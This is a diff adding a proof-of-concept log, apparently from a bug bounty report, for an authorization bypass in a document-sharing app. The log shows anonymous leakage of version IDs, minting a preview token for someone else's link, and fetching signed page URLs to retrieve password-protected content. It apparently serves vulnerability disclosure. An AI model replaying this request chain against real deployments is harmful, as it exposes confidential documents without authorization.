@@ -1,0 +1,33 @@
+================================================================
+H1 END-TO-END CHAIN  2026-09-26T21:59:11Z
+Attacker knows ONLY the shared link URL: /view/cmuiv8b5t000fmqejw0iduodh
+================================================================
+
+--- STEP 1 (ANONYMOUS, no cookies): leak documentVersionId ---
+GET /_next/data/development/view/cmuiv8b5t000fmqejw0iduodh.json?linkId=cmuiv8b5t000fmqejw0iduodh
+  password field      : 'protected'
+  emailProtected      : False
+  document.name       : Victim Q4 Board Deck
+  LEAKED versionId    : cmuiv8b4x0007mqejdzjiyri2
+  teamId              : cmuiv8b3q0001mqejmb79rz8g
+
+--- STEP 2 (attacker's own free account): mint preview token for a link she does not own ---
+POST /api/links/cmuiv8b5t000fmqejw0iduodh/preview
+  HTTP 200  previewToken=74099e55a255e31fd24b4ce5472e919139c01f5b22af8db6bf35345dda32e819
+
+--- STEP 3: request page URLs. No password is sent at any point ---
+POST /api/views/pages  {previewToken, linkId, documentVersionId=cmuiv8b4x0007mqejdzjiyri2, pageNumbers:[1,2,3]}
+  HTTP 200
+   page 1 signed URL len 425
+   page 2 signed URL len 425
+   page 3 signed URL len 425
+
+--- STEP 4: fetch the signed URLs -> victim's confidential content ---
+   page 1: VICTIM CONFIDENTIAL PAGE 1
+ [HTTP 200]
+   page 2: VICTIM CONFIDENTIAL PAGE 2
+ [HTTP 200]
+   page 3: VICTIM CONFIDENTIAL PAGE 3
+ [HTTP 200]
+
+RESULT: victim document content retrieved with no password, no email, no team membership.
